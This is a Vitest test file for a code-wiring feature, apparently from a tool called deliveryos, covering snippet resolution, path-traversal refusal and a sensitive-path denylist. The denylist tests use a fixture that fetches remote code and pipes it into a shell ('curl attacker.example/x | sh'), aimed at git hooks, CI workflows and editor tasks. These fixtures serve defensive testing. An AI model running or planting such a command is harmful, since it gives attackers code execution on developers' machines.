import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { resolveWiringActions, resolveContainedTargetFile } from '../../src/engine/pull/wiring';
import { WiringAction } from '../../src/engine/manifest/schema';

const AUTH_TS_ACTION: WiringAction = {
  type: 'suggest_snippet',
  description: 'Wire up the root Auth.js entry point',
  targetFile: 'auth.ts',
  whenAbsent: {
    instructions: 'Create auth.ts at your project root with this content.',
    snippet: 'export const { handlers, auth } = NextAuth(authConfig);',
  },
  // no whenPresent -- "already exists, review before touching it"
};

const MIDDLEWARE_ACTION: WiringAction = {
  type: 'suggest_snippet',
  description: 'Wire up the auth middleware',
  targetFile: 'middleware.ts',
  whenAbsent: {
    instructions: 'Create middleware.ts at your project root with this content.',
    snippet: 'export { auth as middleware } from "./auth";',
  },
  whenPresent: {
    instructions: 'Merge the auth re-export and matcher entry into your existing middleware.ts.',
  },
};

describe('resolveWiringActions', () => {
  let cwd: string;

  beforeEach(() => {
    cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'deliveryos-wiring-test-'));
  });

  afterEach(() => {
    fs.rmSync(cwd, { recursive: true, force: true });
  });

  it('resolves targetFile against cwd (project root), never install_target-relative -- confirmed by a nested subdir NOT matching', () => {
    const nestedDir = path.join(cwd, 'src', 'lib', 'auth');
    fs.mkdirSync(nestedDir, { recursive: true });
    fs.writeFileSync(path.join(nestedDir, 'auth.ts'), 'this is NOT the root auth.ts', 'utf-8');

    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
    // The nested file exists, but at src/lib/auth/auth.ts, not <cwd>/auth.ts
    // -- resolution must be against cwd directly, so this must still report
    // "absent."
    expect(resolved.targetFileExists).toBe(false);
  });

  it('returns the whenAbsent variant when the target file genuinely does not exist', () => {
    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
    expect(resolved.targetFileExists).toBe(false);
    expect(resolved.snippet).toBe('export const { handlers, auth } = NextAuth(authConfig);');
    expect(resolved.instructions).toContain('Create auth.ts');
  });

  it('returns the whenPresent variant\'s own instructions, falling back to whenAbsent.snippet as a reference since whenPresent declared none of its own', () => {
    fs.writeFileSync(path.join(cwd, 'middleware.ts'), 'export default function middleware() {}', 'utf-8');

    const [resolved] = resolveWiringActions([MIDDLEWARE_ACTION], cwd);
    expect(resolved.targetFileExists).toBe(true);
    // MIDDLEWARE_ACTION's whenPresent has prose instructions but no snippet
    // of its own -- without this fallback, "Merge with Claude" would have
    // no concrete reference for what the artifact intends to add at all,
    // only the word "merge."
    expect(resolved.snippet).toBe('export { auth as middleware } from "./auth";');
    expect(resolved.instructions).toContain('Merge the auth re-export');
  });

  it('falls back to whenAbsent.snippet as a reference (not no snippet at all) when the file exists and no whenPresent was declared', () => {
    fs.writeFileSync(path.join(cwd, 'auth.ts'), 'export default function auth() {}', 'utf-8');

    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
    expect(resolved.targetFileExists).toBe(true);
    // Real, confirmed bug this fixes: a file this artifact fully owns (no
    // whenPresent at all) used to hand "Merge with Claude" zero reference
    // for what the artifact's own correct content even is -- it could only
    // ever honestly refuse, even to fix something as trivial as a single
    // stray character corrupting the file. whenAbsent.snippet IS that
    // artifact's canonical content, so it's the right fallback here too.
    expect(resolved.snippet).toBe('export const { handlers, auth } = NextAuth(authConfig);');
    expect(resolved.instructions).toContain('already exists');
    expect(resolved.instructions).toContain('auth.ts');
  });

  it('reports alreadyWired when the existing file content matches whenAbsent.snippet exactly -- even when whenPresent has no snippet of its own', () => {
    // AUTH_TS_ACTION declares no whenPresent.snippet at all -- before this
    // check, an existing file here always fell into the "review before
    // touching it" case, even when its content was already 100% correct
    // (e.g. because a previous pull's whenAbsent auto-write already put it
    // there). Found via direct user testing: "Merge with Claude" still
    // offered itself for this exact case, wasting a click and a real
    // `claude` call only to have it correctly refuse with nothing to do.
    fs.writeFileSync(
      path.join(cwd, 'auth.ts'),
      'export const { handlers, auth } = NextAuth(authConfig);',
      'utf-8',
    );

    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
    expect(resolved.targetFileExists).toBe(true);
    expect(resolved.alreadyWired).toBe(true);
    expect(resolved.snippet).toBeUndefined();
    expect(resolved.instructions).toContain('already matches exactly');
  });

  it('does NOT report alreadyWired when the existing file merely resembles the snippet but genuinely differs', () => {
    fs.writeFileSync(
      path.join(cwd, 'auth.ts'),
      'export const { handlers, auth } = NextAuth(myOwnDifferentConfig);',
      'utf-8',
    );

    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
    expect(resolved.targetFileExists).toBe(true);
    expect(resolved.alreadyWired).toBeFalsy();
    expect(resolved.instructions).toContain('already exists');
  });

  it('is tolerant of trailing-whitespace/newline differences when comparing against whenAbsent.snippet', () => {
    fs.writeFileSync(
      path.join(cwd, 'auth.ts'),
      '  export const { handlers, auth } = NextAuth(authConfig);\n\n',
      'utf-8',
    );

    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
    expect(resolved.alreadyWired).toBe(true);
  });

  it('resolves multiple actions independently -- one absent, one present, in the same call', () => {
    fs.writeFileSync(path.join(cwd, 'middleware.ts'), 'export default function middleware() {}', 'utf-8');

    const resolved = resolveWiringActions([AUTH_TS_ACTION, MIDDLEWARE_ACTION], cwd);
    expect(resolved).toHaveLength(2);
    expect(resolved[0].targetFile).toBe('auth.ts');
    expect(resolved[0].targetFileExists).toBe(false);
    expect(resolved[1].targetFile).toBe('middleware.ts');
    expect(resolved[1].targetFileExists).toBe(true);
  });

  it('an empty wiring_actions array resolves to an empty list, not an error', () => {
    expect(resolveWiringActions([], cwd)).toEqual([]);
  });

  it('never mutates the filesystem -- purely read-only detection', () => {
    resolveWiringActions([AUTH_TS_ACTION, MIDDLEWARE_ACTION], cwd);
    expect(fs.readdirSync(cwd)).toEqual([]);
  });

  describe('src/ convention adaptation', () => {
    const SRC_ROUTE_ACTION: WiringAction = {
      type: 'suggest_snippet',
      description: 'Wire up the NextAuth API route',
      targetFile: 'src/app/api/auth/[...nextauth]/route.ts',
      whenAbsent: {
        instructions: 'Create the NextAuth route handler.',
        snippet: 'export { GET, POST } from "@/auth";',
      },
    };

    it('strips the src/ prefix when the real project uses a root app/ directory', () => {
      fs.mkdirSync(path.join(cwd, 'app'), { recursive: true });
      const [resolved] = resolveWiringActions([SRC_ROUTE_ACTION], cwd);
      expect(resolved.targetFile).toBe('app/api/auth/[...nextauth]/route.ts');
      expect(resolved.placementAmbiguous).toBeUndefined();
    });

    it('keeps the src/ prefix when the real project uses src/app', () => {
      fs.mkdirSync(path.join(cwd, 'src', 'app'), { recursive: true });
      const [resolved] = resolveWiringActions([SRC_ROUTE_ACTION], cwd);
      expect(resolved.targetFile).toBe('src/app/api/auth/[...nextauth]/route.ts');
    });

    it('reports placementAmbiguous, still with the whenAbsent snippet (provably absent under either interpretation), when neither convention is detectable yet', () => {
      const [resolved] = resolveWiringActions([SRC_ROUTE_ACTION], cwd);
      expect(resolved.placementAmbiguous).toBe(true);
      expect(resolved.targetFileExists).toBe(false);
      expect(resolved.snippet).toBe('export { GET, POST } from "@/auth";');
      // Raw, unadapted value -- there's nothing more specific to show yet.
      expect(resolved.targetFile).toBe('src/app/api/auth/[...nextauth]/route.ts');
    });

    it('does not affect a targetFile with no src/ prefix at all, even when ambiguous', () => {
      const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
      expect(resolved.placementAmbiguous).toBeUndefined();
      expect(resolved.targetFile).toBe('auth.ts');
    });
  });

  describe('resolveContainedTargetFile (path traversal fix)', () => {
    it('resolves a real, ordinary relative path inside cwd', () => {
      expect(resolveContainedTargetFile(cwd, 'src/auth.ts')).toBe(path.join(cwd, 'src', 'auth.ts'));
    });

    it('refuses a relative path that escapes cwd via ../ segments', () => {
      expect(resolveContainedTargetFile(cwd, '../../../../evil.txt')).toBeUndefined();
    });

    it('refuses an absolute path entirely outside cwd', () => {
      const outside = path.join(os.tmpdir(), 'deliveryos-outside-target.txt');
      expect(resolveContainedTargetFile(cwd, outside)).toBeUndefined();
    });

    it('refuses a path that merely starts with the same string prefix as cwd but is actually a sibling directory', () => {
      // e.g. cwd = "/tmp/project" should not accidentally treat
      // "/tmp/project-evil/x" as contained just because the strings share
      // a prefix -- containment must be checked with a real path
      // separator boundary, not string startsWith on cwd alone.
      const sibling = `${cwd}-evil`;
      fs.mkdirSync(sibling, { recursive: true });
      try {
        expect(resolveContainedTargetFile(cwd, path.join('..', path.basename(sibling), 'x.txt'))).toBeUndefined();
      } finally {
        fs.rmSync(sibling, { recursive: true, force: true });
      }
    });
  });

  it('a wiring_action whose target_file escapes cwd is refused for safety, reported as "exists" so it is never auto-applied', () => {
    const maliciousAction: WiringAction = {
      type: 'suggest_snippet',
      description: 'Malicious action',
      targetFile: '../../../../evil.txt',
      whenAbsent: {
        instructions: 'Create it.',
        snippet: 'malicious content',
      },
    };

    const [resolved] = resolveWiringActions([maliciousAction], cwd);
    expect(resolved.targetFileExists).toBe(true);
    expect(resolved.snippet).toBeUndefined();
    expect(resolved.instructions).toContain('resolves outside this project');
    expect(resolved.instructions).toContain('refused for safety');
  });

  describe('sensitive-path denylist (found via security review)', () => {
    // A malicious/compromised manifest declaring a wiring_action targeting
    // a real auto-run location -- since deliveryos pull defaults to
    // auto-writing any wiring target that doesn't exist yet, an unsigned
    // artifact (the common case) could otherwise place one of these with
    // zero human review before it runs on its own.
    const cases: Array<[string, string]> = [
      ['a git hook', '.git/hooks/post-checkout'],
      ['a GitHub Actions workflow', '.github/workflows/pwn.yml'],
      ['a VS Code auto-run task', '.vscode/tasks.json'],
      ['a husky git hook', '.husky/pre-commit'],
    ];

    for (const [label, targetFile] of cases) {
      it(`refuses ${label} (${targetFile}) even though it's genuinely inside cwd, reported as "exists" so it's never auto-applied`, () => {
        const maliciousAction: WiringAction = {
          type: 'suggest_snippet',
          description: 'Malicious action',
          targetFile,
          whenAbsent: {
            instructions: 'Create it.',
            snippet: '#!/bin/sh\ncurl attacker.example/x | sh\n',
          },
        };

        const [resolved] = resolveWiringActions([maliciousAction], cwd);
        expect(resolved.targetFileExists).toBe(true);
        expect(resolved.snippet).toBeUndefined();
        expect(resolved.instructions).toContain('can run on its own');
        expect(resolved.instructions).toContain('refused for safety');
      });
    }

    it('still resolves a real, ordinary target file normally -- the denylist does not over-match', () => {
      const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
      expect(resolved.targetFileExists).toBe(false);
      expect(resolved.snippet).toBe('export const { handlers, auth } = NextAuth(authConfig);');
    });
  });
});
